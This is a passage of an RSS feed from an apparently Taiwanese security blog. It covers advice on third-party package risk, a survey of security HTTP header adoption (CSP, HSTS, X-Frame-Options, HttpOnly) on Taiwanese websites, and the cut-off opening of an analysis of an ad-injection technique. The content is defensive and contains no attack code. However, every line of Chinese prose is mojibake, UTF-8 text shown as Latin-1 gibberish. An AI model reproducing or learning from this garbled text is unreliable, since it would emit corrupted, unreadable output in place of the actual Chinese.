&lt;p&gt;ä¼æ¥­è©²å¦‚ä½•è‡ªä¿ï¼Ÿä½¿ç”¨ OpenSource ç¬¬ä¸‰æ–¹å¥—ä»¶æˆ–è€…æ˜¯ç³»çµ±å§”å¤–é–‹ç™¼ï¼Œæ˜¯ä¼æ¥­ç„¡å¯é¿å…çš„ã€‚å¦‚æœæ˜¯ç¬¬ä¸‰æ–¹å¥—ä»¶ï¼Œå¹³æ™‚å¯ä»¥å¤šåŠ æ³¨æ„å¥—ä»¶çš„è³‡å®‰æ¶ˆæ¯ï¼Œå¦‚æœä¸€æœ‰æ–°çš„æ¼æ´è¢«ç™¼ç¾ï¼Œå°‡å¯ä»¥åœ¨ç¬¬ä¸€æ™‚é–“æ‡‰è®Šã€‚è‹¥æ²’æœ‰è¶³å¤ äººåŠ›å¯†åˆ‡æ³¨æ„è³‡å®‰æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥å§”è«‹è³‡å®‰é¡§å•å» å•†å”åŠ©ï¼Œåœ¨å¾—çŸ¥è³‡å®‰æ¶ˆæ¯çš„ç¬¬ä¸€æ™‚é–“é€šå ±ä¼æ¥­ã€‚å§”å¤–é–‹ç™¼çš„ç³»çµ±ï¼Œä¼æ¥­å¯ä»¥è¦æ±‚å» å•†æå‡ºå°ˆæ¥­å…¬æ­£ç¬¬ä¸‰æ–¹è³‡å®‰å…¬å¸é€²è¡Œæª¢æ¸¬ï¼Œä¸¦ä¸”æå‡ºå®‰å…¨å ±å‘Šï¼Œè­‰æ˜è©²ç³»çµ±æœ‰ç¶“éæ»²é€æ¸¬è©¦ç­‰å®‰å…¨æª¢æ¸¬ï¼Œä¿éšœé›™æ–¹çš„æ¬Šåˆ©ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœç³»çµ±å·²ç¶“è¢«å…¥ä¾µäº†ï¼Œæˆ–è€…æ˜¯è¢«æ­éœ²äº†å®‰å…¨æ¼æ´ï¼Œè©²å¦‚ä½•è‡ªä¿å‘¢ï¼Ÿåœ¨æ¼æ´å¤§é‡æ­éœ²çš„æƒ…æ³ä¸‹ï¼Œç³»çµ±æ›´æœƒæˆç‚ºæ”»æ“Šè€…çš„ç›®æ¨™ã€‚å› æ­¤è¦å‹™å¿…å¯†åˆ‡æ³¨æ„ä½¿ç”¨è©²å¥—ä»¶çš„ä¼ºæœå™¨ç‹€æ³ï¼Œä¸¦ä¸”éµå¾ªä»¥ä¸‹åŸå‰‡ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¯†åˆ‡æ³¨æ„å®˜æ–¹çš„æ›´æ–°ç¨‹å¼ä¸¦ç«‹å³æ›´æ–°&lt;/li&gt;
  &lt;li&gt;æ­¤å°ä¼ºæœå™¨çš„å¸³è™Ÿå¯†ç¢¼åˆ‡å‹¿èˆ‡ä»–å°å…±ç”¨&lt;/li&gt;
  &lt;li&gt;å°‡æ­¤å°ä¼ºæœå™¨èˆ‡å…¶ä»–ä¼ºæœå™¨éš”é›¢ï¼Œé¿å…é­å…¥ä¾µæ™‚å—å®³ç¯„åœæ“´å¤§&lt;/li&gt;
  &lt;li&gt;ç•°åœ°å‚™ä»½ä¼ºæœå™¨çš„ç³»çµ±è¨˜éŒ„ï¼Œä¸¦å®šæ™‚æª¢é–±è¨˜éŒ„ï¼Œè§€å¯Ÿæ˜¯å¦æœ‰å¯ç–‘è¡Œç‚º&lt;/li&gt;
  &lt;li&gt;è€ƒæ…®æ¡ç”¨ Web Application Firewall (WAF)ã€ModSecurity ä¼ºæœå™¨å®‰å…¨æ¨¡çµ„ï¼Œå¢åŠ æ”»æ“Šé›£åº¦&lt;/li&gt;
  &lt;li&gt;é‡æ–°è©•ä¼°ä½¿ç”¨é­å…¥ä¾µå¥—ä»¶çš„å¿…è¦æ€§ä»¥åŠå®‰å…¨è€ƒé‡ï¼Œé¿å…æˆç‚ºä¼æ¥­çš„éš±å«é¢¨éšª&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶åŠ é€Ÿé–‹ç™¼ç¯€çœæˆæœ¬çš„åŒæ™‚ï¼Œå‹™å¿…ä¹Ÿè¦è€ƒæ…®å®‰å…¨çš„å•é¡Œï¼Œæ‰ä¸æœƒå› å°å¤±å¤§ï¼Œé€ æˆä¼æ¥­æ›´å¤§çš„æå¤±ã€‚åŒæ™‚ä¼æ¥­ä¹Ÿå¿…é ˆå¢åŠ è³‡å®‰çš„ç´ é¤Šä»¥åŠäº†è§£æ”»æ“Šè€…çš„æ€ç¶­ï¼Œåˆ¥è®“è‡ªå·±çš„ä¼æ¥­æˆç‚ºä¸‹ä¸€å€‹è³‡å®‰äº‹ä»¶å ±å°çš„å°è±¡ã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues/</link>
                <guid>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues</guid>
                <pubDate>Fri, 14 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Headers çš„è³‡å®‰è­°é¡Œ (1)</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;éš¨è‘—é§­å®¢æ”»æ“Šäº‹ä»¶æ—¥ç›Šæ¼¸å¢ï¼ŒåŸæœ¬ç¶“å¸¸è¢«å¤§çœ¾æ‰€å¿½è¦–çš„ç¶²ç«™è³‡å®‰å•é¡Œï¼Œç¾åœ¨å·²ç¶“é€æ¼¸å—åˆ°é‡è¦–ã€‚ä½†æ˜¯ï¼Œè¨±å¤šä¼æ¥­ä¸»æˆ–é–‹ç™¼äººå“¡é›–ç„¶å¾ˆæƒ³å¼·åŒ–ç¶²ç«™çš„å®‰å…¨æ€§ï¼Œå»ä¸çŸ¥é“è©²å¦‚ä½•å¾ä½•è‘—æ‰‹ã€‚&lt;/p&gt;

&lt;p&gt;ä¼æ¥­ä¸»é€šå¸¸æƒ³åˆ°çš„æ”¹å–„æ–¹æ¡ˆæ˜¯æ·»è³¼è³‡å®‰è¨­å‚™ï¼Œå¸Œæœ›å¯ä»¥ä¸€å‹æ°¸é€¸ã€‚æˆ‘å€‘å§‘ä¸”å…ˆä¸è«‡ã€Œ&lt;strong&gt;è³‡è¨Šç•Œæ²’æœ‰æ°¸é çš„å®‰å…¨&lt;/strong&gt;ã€é€™ä»¶äº‹ï¼Œä¼æ¥­å…‰æ˜¯è¦è²·åˆ°æœ‰æ•ˆçš„è³‡å®‰è¨­å‚™å°±æ˜¯ä¸€ä»¶ä»¤äººé ­ç—›çš„äº‹æƒ…ï¼Œä¸ä½†è¦èŠ±è¨±å¤šæ™‚é–“è½å–å» å•†çš„ç°¡å ±ï¼Œè€—è²»å¤§ç­†çš„ç¶“è²»æ¡è³¼ï¼Œè³¼è²·ä¹‹å¾Œé‚„è¦è«‹å“¡å·¥æˆ–åŸå» æŠ€è¡“äººå“¡å”åŠ©èª¿æ ¡ã€è¨­å®šæˆ–æ•™å­¸ï¼Œå¦å‰‡è²·äº†ç­‰æ–¼æ²’è²·ã€‚&lt;/p&gt;

&lt;p&gt;è€Œå°æ–¼æŠ€è¡“äººå“¡ä¾†èªªï¼Œè‹¥è¦å¼·åŒ–ç¶²ç«™å®‰å…¨æ€§ï¼Œå¿…é ˆå…ˆäº†è§£é§­å®¢å¦‚ä½•æ”»æ“Šï¼Œæ‰çŸ¥é“å¦‚ä½•å»ºç«‹æ ¹æœ¬æ€§çš„é˜²ç¦¦æ©Ÿåˆ¶ã€‚ä½†æ˜¯ä¼æ¥­ä¸»é€šå¸¸æ¨ä¸å¾—é€å“¡å·¥å»åƒåŠ å°ˆæ¥­çš„æ•™è‚²è¨“ç·´ï¼Œå°ç£å“¡å·¥æ‹¿çš„ 22k ä½è–ªä¹Ÿä½å¾—å¸¸å¸¸ä»¤äººæ¨ä¸å¾—èŠ±éŒ¢å»ä¸Šèª²ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœæœ‰ä¸€ç¨®æ–¹å¼å¯ä»¥å¢å¼·ç¶²ç«™çš„åŸºæœ¬å®‰å…¨æ€§ï¼Œè€Œä¸”ä¸éœ€è¦èŠ±å¤§éŒ¢ï¼Œåˆå¯ä»¥è®“é–‹ç™¼äººå“¡ä¸ç”¨å¤§å¹…åº¦è®Šæ›´ç¨‹å¼ï¼Œæ‡‰è©²æ˜¯å€‹çš†å¤§æ­¡å–œçš„æ–¹æ¡ˆï¼Ÿ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç©¶ç«Ÿæœ‰æ²’æœ‰ä½æˆæœ¬çš„ç°¡æ˜“é˜²ç¦¦æ–¹æ³•&quot;&gt;ç©¶ç«Ÿæœ‰æ²’æœ‰ä½æˆæœ¬çš„ç°¡æ˜“é˜²ç¦¦æ–¹æ³•ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æœ‰çš„ï¼ç›®å‰å„å®¶ç€è¦½å™¨ (Google Chromeã€Firefoxã€Safariã€IE) å…¶å¯¦å·²ç¶“æ”¯æ´è¨±å¤šç¨®è³‡å®‰ç›¸é—œçš„ HTTP headersã€‚é–‹ç™¼äººå“¡è‹¥åœ¨ä¼ºæœå™¨è¨­å®šåŠ å…¥æŸäº› headersï¼Œç€è¦½å™¨æ”¶åˆ° response æ™‚å°±æœƒåŸ·è¡Œç›¸å°æ‡‰çš„é˜²ç¦¦æ©Ÿåˆ¶ï¼Œå¦‚æ­¤ä¸€ä¾†å¯ç›´æ¥æå‡ç¶²é æ‡‰ç”¨ç¨‹å¼çš„åŸºæœ¬å®‰å…¨æ€§ã€‚é€™äº› HTTP headers é€šå¸¸ä¹Ÿå·²è¢«è¨±å¤šå¸¸è¦‹çš„ framework ç´å…¥çˆ²åŸºæœ¬åŠŸèƒ½ï¼Œå³ä½¿é–‹ç™¼äººå“¡ä¸æ¸…æ¥šå¦‚ä½•ä¿®æ”¹ä¼ºæœå™¨ç›¸é—œè¨­å®šï¼Œä¹Ÿå¯ä»¥ä¾é  framework æä¾›çš„æ–¹å¼ä¾†ä½¿ç”¨é€™äº› headersã€‚å› æ­¤ä½¿ç”¨é€™äº› headers ä¾†æå‡ç¶²ç«™å®‰å…¨æ€§å°±æˆçˆ²é —å…· CP å€¼çš„æ–¹å¼ã€‚&lt;/p&gt;

&lt;p&gt;ç›®å‰æœ€å¸¸è¦‹çš„è³‡å®‰ç›¸é—œ HTTP headers å¯åƒè€ƒ &lt;a href=&quot;https://www.owasp.org/index.php/List_of_useful_HTTP_headers&quot;&gt;OWASP ç¶²ç«™&lt;/a&gt; æ‰€æ¢åˆ—çš„å…§å®¹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy (X-Content-Security-Policyã€X-Webkit-CSP éƒ½æ˜¯åŒä¸€ç³»åˆ—)&lt;/li&gt;
  &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
  &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
  &lt;li&gt;X-Frame-Options&lt;/li&gt;
  &lt;li&gt;X-XSS-Protection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é‚„æœ‰ä¸€äº›å…¶ä»–çš„è³‡å®‰ç›¸é—œ HTTP headers ä¹Ÿå€¼å¾—æ³¨æ„ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access-Control-Allow-Origin&lt;/li&gt;
  &lt;li&gt;X-Download-Options&lt;/li&gt;
  &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ€å¾Œæœ‰ä¸€é …æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ Cookie çš„å®‰å…¨è¨­å®šï¼Œç”±æ–¼ Cookie ä¹Ÿæ˜¯ HTTP headers çš„ä¸€éƒ¨ä»½ï¼Œå› æ­¤æœ¬æ–‡ä¹Ÿå°‡å…¶åˆ—å‡ºï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
  &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸Šè¿° headers çš„æ•¸é‡æ˜¯ä¸æ˜¯ç¨å¾®è¶…éä½ çš„æƒ³åƒï¼Ÿå…¶å¯¦é€™äº›æŠ€è¡“æ—©å·²è¢«å¾ˆå¤šå¤§å…¬å¸æ¡ç”¨ï¼Œåƒæ˜¯ Googleã€Facebookã€Twitter ç­‰å¸¸è¦‹çš„ç¶²è·¯æœå‹™éƒ½å¯çœ‹åˆ°é€™äº› headers çš„è¹¤å½±ã€‚ä¸‹é¢é€™å¼µåœ–ç‰‡ä½¿ç”¨ Chrome çš„ Inspector ä¾†è§€å¯Ÿ Twitter çš„ HTTP response å…§å®¹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot; alt=&quot;Twitter çš„ HTTP reponse&quot; title=&quot;Twitter çš„ HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾ç•«ç´…ç·šçš„éƒ¨åˆ†æˆ‘å€‘å¯çœ‹åˆ° Twitter åœ¨ Cookie è¨­å®šäº† Secure èˆ‡ HttpOnly é€™å…©å€‹å±¬æ€§ï¼Œä¸¦ä¸”æ¡ç”¨äº† Strict-Transport-Securityã€X-Content-Type-Optionsã€X-Frame-Optionsã€X-XSS-Protection é€™å¹¾ç¨® headersã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœè¦ºå¾—ç”¨åœ–å½¢ç•Œé¢å¤ªéº»ç…©ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ command line çš„å·¥å…·ä¾†è§€å¯Ÿã€‚ä¸‹é¢é€™å¼µåœ–ç‰‡ä½¿ç”¨ curl ä¾†è§€å¯Ÿ Facebook çš„ HTTP response å…§å®¹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot; alt=&quot;Facebook çš„ HTTP response&quot; title=&quot;Facebook çš„ HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ä¸Šè¿°è³‡å®‰ç›¸é—œçš„-headers-æƒ³è§£æ±ºå“ªäº›å•é¡Œ&quot;&gt;ä¸Šè¿°è³‡å®‰ç›¸é—œçš„ headers æƒ³è§£æ±ºå“ªäº›å•é¡Œï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç›®å‰é€™äº›è³‡å®‰ç›¸é—œçš„ HTTP headers æƒ³è§£æ±ºçš„å•é¡Œä¸»è¦å¯åˆ†ç‚ºä»¥ä¸‹äº”å¤§é¡ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é˜²ç¦¦ XSS (Cross Site Scripting)ï¼š
    &lt;ul&gt;
      &lt;li&gt;Content-Security-Policy&lt;/li&gt;
      &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
      &lt;li&gt;X-XSS-Protection&lt;/li&gt;
      &lt;li&gt;X-Download-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é˜²ç¦¦ Clickjackingï¼š
    &lt;ul&gt;
      &lt;li&gt;X-Frame-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å¼·åŒ– HTTPS æ©Ÿåˆ¶ï¼š
    &lt;ul&gt;
      &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
      &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é¿å…ç€è¦½å™¨èª¤åˆ¤æ–‡ä»¶å½¢æ…‹ï¼š
    &lt;ul&gt;
      &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿è­·ç¶²ç«™è³‡æºåˆ¥è¢«ä»»æ„å­˜å–ï¼š
    &lt;ul&gt;
      &lt;li&gt;Access-Control-Allow-Originï¼ˆæ­¤ header è‹¥è¨­å®šéŒ¯èª¤æœƒé©å¾—å…¶åï¼ï¼‰&lt;/li&gt;
      &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä¸­ &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&quot;&gt;XSS&lt;/a&gt; èˆ‡ &lt;a href=&quot;https://www.owasp.org/index.php/Clickjacking&quot;&gt;Clickjacking&lt;/a&gt; æ˜¯ç›®å‰å¸¸è¦‹çš„æ”»æ“Šæ‰‹æ³•ï¼Œå°¤å…¶ XSS ç›®å‰ä»é«˜å±… &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;OWASP Top 10 2013 çš„ç¬¬ä¸‰å&lt;/a&gt;ï¼Œå…¶åš´é‡æ€§å¯è¦‹ä¸€æ–‘ã€‚è€Œåœ¨æˆ‘å€‘åŸ·è¡Œéçš„è¨±å¤š&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æ¡ˆä¹‹ä¸­ï¼Œè¢«æˆ‘å€‘æ‰¾å‡º XSS å¼±é»çš„ç¶²ç«™é«˜é”ä¹æˆï¼å¯¦åœ¨æ˜¯ä¸èƒ½è¼•å¿½é€™äº›å•é¡Œã€‚è‹¥èƒ½é™ä½é€™äº›æ‰‹æ³•æ”»æ“ŠæˆåŠŸçš„æ©Ÿç‡ï¼Œä¼æ¥­çš„åˆ©ç›Šå°±èƒ½æœ‰æ›´å¤šçš„å®‰å…¨ä¿éšœï¼Œå®¢æˆ¶å°ä¼æ¥­çš„ä¿¡è³´äº¦æœƒæ›´åŠ ç©©å›ºã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç›®å‰é€™äº›-headers-çš„ä½¿ç”¨ç‹€æ³&quot;&gt;ç›®å‰é€™äº› headers çš„ä½¿ç”¨ç‹€æ³ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;é€™éº¼ç°¡ä¾¿çš„åŸºæœ¬é˜²ç¦¦æ–¹å¼ï¼Œç†ç•¶å»£ç‚ºä¼æ¥­æ‰€æ¡ç”¨ï¼Œå› æ­¤æˆ‘å€‘é‡å° &lt;a href=&quot;http://www.alexa.com/topsites/countries/TW&quot;&gt;Alexa Taiwan Top 525&lt;/a&gt; ä¸­æŒ‘å‡º 513 å€‹å¯æ­£å¸¸ä½¿ç”¨çš„ç¶²ç«™ï¼ˆå’¦ï¼Ÿä¸€èˆ¬ä¸æ˜¯ Top 500 å—ï¼Ÿæˆ‘æ²’é¨™ä½ ï¼Œ&lt;a href=&quot;http://www.alexa.com/topsites/countries;20/TW&quot;&gt;çœŸçš„æœ‰ 525&lt;/a&gt;ï¼‰ï¼Œèª¿æŸ¥é€™äº›ç¶²ç«™æ˜¯å¦ä½¿ç”¨æŸäº›å¸¸è¦‹çš„ HTTP headersã€‚çµæœç›¸ç•¶ä»¤äººå¤±æœ›ï¼Œè¨±å¤šç¶²ç«™éƒ½æœªæ¡ç”¨é€™äº› headersã€‚çµ±è¨ˆæ•¸æ“šå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾çµ±è¨ˆçµæœä¸­å¯ç™¼ç¾æœ€å¤šäººä½¿ç”¨çš„ HttpOnly åªæœ‰ 21.25%ï¼Œæ’åç¬¬äºŒçš„ X-Frame-Options ä¹Ÿåªæœ‰ 7.80%ã€‚è€Œä¸”é€™äº›æ•¸æ“šå°šæœªå°‡ Googleã€Twitter ç­‰å¤§å…¬å¸æ’é™¤ï¼Œè‹¥å°‡å‰è¿°åœ‹éš›å…¬å¸æ’é™¤å¾Œï¼Œé€™äº›æ¯”ç‡ææ€•æœƒæ›´ä½ã€‚&lt;/p&gt;

&lt;p&gt;ä¸éåœ¨ä¸Šè¿°ç¶²ç«™ä¸­æœ‰ä¸å°‘å…¥å£ç¶²ç«™ã€æ¼«ç•«ç¶²ç«™ã€è‰²æƒ…ç¶²ç«™ï¼Œæˆ–æ˜¯å…¬å¸ä¸¦éå°ç£ä¼æ¥­ï¼Œç„¡æ³•åæ‡‰å°ç£çš„ä½¿ç”¨ç‹€æ³ã€‚æ°å¥½åœ¨ 2012 å¹´ 10 æœˆå°ç£æœ‰è¨±å¤šç¶²è·¯æœå‹™å…¬å¸ä¸€åŒæˆç«‹äº† &lt;a href=&quot;http://www.tieataiwan.org/index.php&quot;&gt;TIEA å°ç£ç¶²è·¯æš¨é›»å­å•†å‹™ç”¢æ¥­ç™¼å±•å”æœƒ&lt;/a&gt;ï¼Œç›®å‰ç¶²ç«™ä¸Šçš„&lt;a href=&quot;http://www.tieataiwan.org/member.php&quot;&gt;æœƒå“¡åå–®&lt;/a&gt;ä¸­æœ‰ 116 å€‹æœƒå“¡ï¼Œå…¶ä¸­ä¸å°‘é —å…·ä»£è¡¨æ€§ï¼Œæ­£å¥½å¯è§€å¯Ÿé€™äº›å…¬å¸ç‡Ÿé‹çš„ç¶²ç«™æ˜¯å¦æœ‰æ¡ç”¨é€™äº› headersã€‚çµ±è¨ˆæ•¸æ“šå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾ˆå¯æƒœåœ°ï¼Œæ‰€æœ‰ headers çš„æ¡ç”¨ç‡æ¯”èµ·ä¸Šä¸€ä»½æ•¸æ“šéƒ½é‚„è¦ä½ã€‚é™¤éå…¬å¸ç¶²ç«™åƒ…ä½¿ç”¨éœæ…‹é é¢ï¼Œç¶²ç«™ä¸Šæ²’æœ‰ä»»ä½•å•†æ¥­é‚è¼¯ã€å¸³è™Ÿã€å€‹è³‡ï¼Œå¦å‰‡æ‡‰è©²éƒ½è¦ä½¿ç”¨åˆé©çš„ headers ç‚ºä½ çš„è³‡å®‰é˜²ç¦¦å·¥äº‹å¤šç¯‰ä¸€é“ç‰†ã€‚&lt;/p&gt;

&lt;p&gt;è€Œä¸”ç”±æ–¼ meeya ç›®å‰æ²’æœ‰æ­£å¼å®˜ç¶²ï¼Œæ˜¯ç›´æ¥ä½¿ç”¨ facebook ç²‰çµ²é ä½œç‚ºå®˜ç¶²ï¼Œå› æ­¤ Content-Security-Policyã€Set-Cookie Secureã€Strict-Transport-Securityã€X-Content-Type-Optionsã€X-Frame-Optionsã€X-XSS-Protection ç­‰å…­é … headers çš„çµ±è¨ˆæ•¸é‡éƒ½é‚„è¦å†æ¸›ä¸€ï¼Œé “æ™‚ Content-Security-Policy èˆ‡ Strict-Transport-Security çš„ç¸½æ•¸é‡çš†é™è‡³ 0 å€‹ã€‚æ­¤ç‹€æ³é¡¯ç¤ºå‡ºï¼Œå³ä½¿æ˜¯åœ¨ä¸€äº›å°ç£ä¸»æµçš„ç¶²ç«™ä¸­ï¼Œç›¸é—œç‡Ÿé‹äººå“¡åœ¨è³‡å®‰é ˜åŸŸä»æœ‰è¨±å¤šåŠªåŠ›èˆ‡å­¸ç¿’çš„ç©ºé–“ã€‚&lt;/p&gt;

&lt;p&gt;è¨±å¤šå°ç£ä¼æ¥­ç¶“å¸¸é¡§è‘—è¡æ¥­ç¸¾ã€é–‹ç™¼æ–°åŠŸèƒ½ã€è¶•è‘—è®“æ–°æœå‹™ä¸Šç·šï¼Œå»å¿½ç•¥äº†éå¸¸é‡è¦çš„åŸºç¤è³‡å®‰å»ºè¨­ï¼Œå¾€å¾€æ˜¯åœ¨é­åˆ°æ”»æ“Šå¾Œæ‰å¤§å‘¼æå¤±æ…˜é‡ï¼Œç”šè‡³æ˜¯å·²è¢«æ»²é€äº†è€Œä¸è‡ªçŸ¥ï¼Œå…¶ä¼æ¥­åˆ©ç›Šèˆ‡æ°‘çœ¾å€‹è³‡çš„ä¿éšœçš†ç›¸ç•¶ä»¤äººæ“”æ†‚ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¸‹é›†é å‘Š&quot;&gt;ä¸‹é›†é å‘Š&lt;/h3&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æœ¬æ–‡çš„çºŒä½œæˆ‘å€‘æœƒåˆ†å¹¾å€‹ç¯‡ç« è©³è«‡å„ç¨® headers çš„ä½¿ç”¨æ–¹å¼ä¸¦ä»‹ç´¹å¯¦éš›æ¡ˆä¾‹ï¼Œä¸‹ä¸€ç¯‡å°‡æœƒæ¢è¨å°ˆé–€é˜²ç¦¦ XSS çš„ HTTP headersï¼Œæ•¬è«‹æœŸå¾…ï¼ç­‰ä¸åŠçš„æœ‹å‹å€‘å°±è«‹å…ˆç”¨ä¸Šé¢çš„ä¸€äº›é—œéµå­—è‡ªè¡Œä¸Šç¶²æŸ¥è©¢å›‰ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/</link>
                <guid>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1</guid>
                <pubDate>Mon, 10 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ</title>
                <description>&lt;p&gt;æ­¡è¿ä¾†åˆ°æˆ‘å€‘çš„æŠ€è¡“æ–‡ç« å°ˆæ¬„ï¼&lt;/p&gt;

&lt;p&gt;ä»Šå¤©æˆ‘å€‘ä¾†è«‡è«‡ã€Œå»£å‘Šé¡¯ç¤ºæ‰‹æ³•ã€ã€‚ä¸å°‘å»£å‘Šå•†ç‚ºäº†è¦å¢åŠ å»£å‘Šçš„æ›å…‰ä»¥åŠé»æ“Šç‡ï¼Œæœƒä½¿ç”¨å„ç¨®æ‰‹æ³•å¼·è¿«ä½¿ç”¨è€…é¡¯ç¤ºå»£å‘Šã€‚ä¾‹å¦‚å½ˆå‡ºå¼è¦–çª—ã€å…§åµŒå»£å‘Šã€å¼·åˆ¶è·³è½‰ç­‰ç­‰ã€‚ä½†é€™æ¨£çš„æ‰‹æ³•æœ‰ä»€éº¼å¥½æçš„å‘¢ï¼Ÿä»Šå¤©æœ‰ä¸€å€‹å¾ˆç‰¹åˆ¥çš„æ¡ˆä¾‹ï¼Œè®“æˆ‘å€‘ä¾†çœ‹çœ‹ä¸€å€‹ç¶²ç«™ã€Œ&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com æ¥µé€Ÿæ¼«ç•«&lt;/a&gt;ã€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_02.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com&quot; /&gt;&lt;br /&gt;
é€™æ˜¯ä¸€å€‹å¸¸è¦‹çš„ç¶²è·¯æ¼«ç•«ç¶²ç«™ï¼Œæ¥è‘—é»æ“Šé€²å»æ¼«ç•«é é¢ã€‚&lt;br /&gt;
&lt;!-- more --&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_03.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com æ¼«ç•«é é¢&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - 1kkk.com æ¼«ç•«é é¢&quot; /&gt;&lt;br /&gt;
ç¶²ç«™ä¸­å……æ–¥è‘—ç…©äººçš„å»£å‘Šï¼Œä¸¦ä¸”çªç„¶ä¸€é–ƒè€Œé Safari çš„ã€Œé–±è®€åˆ—è¡¨ã€å‹•ç•«ã€‚æ€éº¼æœƒçªç„¶é€™æ¨£å‘¢ï¼Ÿè®“æˆ‘å€‘æ‰“é–‹ã€Œé–±è®€åˆ—è¡¨ã€ä¸€æ¢ç©¶ç«Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_04.png&quot; alt=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é¡¯ç¤ºé–±è®€å´é‚Šæ¬„&quot; title=&quot;å¥‡å„ªå»£å‘Š Qiyou å»£å‘Šæ‰‹æ³•å‰–æ - Safari é¡¯ç¤ºé–±è®€å´é‚Šæ¬„&quot; /&gt;&lt;br /&gt;
